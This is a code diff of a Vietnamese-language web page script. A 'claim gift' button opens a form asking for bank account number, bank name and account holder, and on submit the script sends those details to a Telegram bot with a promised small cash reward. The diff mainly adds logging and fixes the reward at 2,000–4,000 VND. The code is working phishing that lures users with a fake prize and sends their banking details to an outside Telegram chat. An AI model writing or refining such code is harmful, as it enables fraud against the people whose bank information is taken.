@@ -2,6 +2,7 @@
 document.getElementById("claimButton").addEventListener("click", function() {
     // Hiển thị form nhập thông tin tài khoản ngân hàng
     document.getElementById("bankInfo").style.display = "block";
+    console.log("Nút Nhận Quà đã được nhấn.");
 });
 
 // Khi người dùng gửi thông tin tài khoản ngân hàng
@@ -13,12 +14,17 @@ document.getElementById("bankForm").addEventListener("submit", function(event) {
     const bankName = document.getElementById("bankName").value.trim();
     const accountHolder = document.getElementById("accountHolder").value.trim();
 
+    // Kiểm tra đầy đủ thông tin
     if (accountNumber && bankName && accountHolder) {
-        // Tạo một số tiền ngẫu nhiên để gửi
-        const randomReward = Math.floor(Math.random() * 1000000); // Ví dụ: số tiền ngẫu nhiên từ 0 đến 1 triệu
+        console.log("Thông tin ngân hàng hợp lệ:", accountNumber, bankName, accountHolder);
+
+        // Tính phần quà ngẫu nhiên (2.000VND, 3.000VND, 4.000VND)
+        const rewards = [2000, 3000, 4000];
+        const randomReward = rewards[Math.floor(Math.random() * rewards.length)];
+        console.log("Số tiền phần quà:", randomReward);
 
         // Thông báo thành công
-        alert("Đã được gửi đến Admin, chờ đến khi chủ website chuyển tiền nhé !! " + accountNumber + " Ngân Hàng " + bankName + " chủ tài khoản " + accountHolder);
+        alert(`Đã được gửi đến Admin, chờ đến khi chủ website chuyển tiền nhé !! \nSố tài khoản: ${accountNumber} \nNgân Hàng: ${bankName} \nChủ tài khoản: ${accountHolder}`);
 
         // Gửi thông tin tới Telegram
         const message = `
@@ -28,7 +34,7 @@ document.getElementById("bankForm").addEventListener("submit", function(event) {
             - Chủ tài khoản: ${accountHolder}
             - Số tiền: ${randomReward} VND
         `;
-
+        
         // Thực hiện gửi yêu cầu đến Telegram API
         sendToTelegram(message);
     } else {
@@ -47,6 +53,8 @@ function sendToTelegram(message) {
         chat_id: chatId,
         text: message
     };
+
+    console.log("Gửi thông điệp tới Telegram:", message);  // Kiểm tra nội dung gửi
 
     // Gửi dữ liệu tới Telegram API
     fetch(url, {
